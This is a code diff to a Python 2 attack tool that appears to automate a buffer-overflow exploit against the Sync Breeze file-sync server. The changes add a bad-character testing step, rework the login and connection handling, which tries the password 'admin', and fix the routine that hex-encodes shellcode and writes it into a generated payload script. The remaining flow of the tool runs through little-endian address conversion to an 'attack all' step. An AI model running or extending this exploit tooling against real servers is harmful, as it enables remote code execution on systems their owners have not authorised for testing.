@@ -24,15 +24,20 @@ Y="\033[1;33m"
 class Sync_Breeze():
     
      def __init__(self):
+           
             global W
             global R
             global G
             global O
             global B
             global P
-            global Y          
-            time.sleep(2)
-            print Y+"\n[A]"+W+R+"* buffer_Helper Start Sync Breeze  mode * "+W+Y+"[C]"+W
+            global Y    
+            mode = """
+            ========================                          
+               Target Sync Breeze
+            ========================
+            """
+            print O+mode+W      
             time.sleep(2)
             print Y+"\n[A]"+W+P+"* use url as 'https/http://' login page/ * "+W+Y+"[C]"+W
             time.sleep(2)
@@ -42,6 +47,7 @@ class Sync_Breeze():
             self.connect_servser()
             self.Option_return()
             self._hexadecimal() 
+            self.import_char()
             self.little_endian()        
             self.attack_all()
             self.auto_write()
@@ -122,6 +128,7 @@ class Sync_Breeze():
                            self.connect_servser() 
                            self.Option_return()
                            self._hexadecimal() 
+                           self.import_char()
                            self.little_endian()        
                            self.attack_all()
                            self.auto_write()   
@@ -151,10 +158,11 @@ class Sync_Breeze():
  
      def connect_servser(self):
         try:
-            session = requests.session()
-            response = session.get(self.target_url,timeout=5)
-            if response.ok == True:
-     	       while True:
+            try:
+               session = requests.session()
+               response = session.get(self.target_url,timeout=5)
+               if response.ok == True:
+     	          while True:
                     try:
                        session = requests.session()
                        password = 'admin' 
@@ -170,11 +178,11 @@ class Sync_Breeze():
                  	   time.sleep(2)
                  	   print Y+"\n[+]"+W+R+"please Restart The Service"+W+Y+"...!!!"+W
                  	   break
-            else:
-                print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
-                print Y+"\n[+]"+W+w+"please Restart The Service and try agin"+W+Y+"...!!!"+W  	   
-                self.connect_servser()
-        except requests.exceptions.ReadTimeout:
+               else:
+                   print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
+                   print Y+"\n[+]"+W+w+"please Restart The Service and try agin"+W+Y+"...!!!"+W  	   
+                   self.connect_servser()
+            except requests.exceptions.ReadTimeout:
                 print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
                 print Y+"\n[+]"+W+P+"please Restart The Service and try agin"+W+Y+"...!!!"+W 
                 self.Fuzzing__()
@@ -229,6 +237,33 @@ class Sync_Breeze():
                  except KeyboardInterrupt:
                        print  Banner
                        exit() 
+     def import_char(self): 
+         try:
+            
+            Bad = "yes".lower()
+            Bad_no = "no".lower()                 
+            bad_op = str(raw_input(Y+"\n[<>]"+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
+            
+            if bad_op == Bad and len(Bad)==3: 
+                banner = """  
+                    ========================                          
+                      Bad_Character start
+                    ========================\n 
+                     """
+                print B+banner+W 
+                with open('.data','w')as data :
+                    data1 = data.write(self.target_url+'\n'+str(self.location))                             
+                time.sleep(2)
+                from Bad_Character import Bad_Character_SyncBreeze             
+                run = Bad_Character_SyncBreeze()
+            elif bad_op ==Bad_no and len(Bad_no)==2: 
+                pass
+            else:
+              print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
+              self.import_char()                   
+         except KeyboardInterrupt:
+                print  Banner
+                exit()                                  
          
      def little_endian(self):
          
@@ -298,7 +333,7 @@ class Sync_Breeze():
      def auto_write(self): 
               
                 try:                
-                  shell =shell_code.encode("hex")
+                  shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                   copy_format= shutil.copy("./SyncBreeze_payload.txt","./SyncBreeze_payload.py") 
@@ -342,5 +377,4 @@ class Sync_Breeze():
 		          
 if __name__ == '__main__':
    Sync_Breeze()
-
 
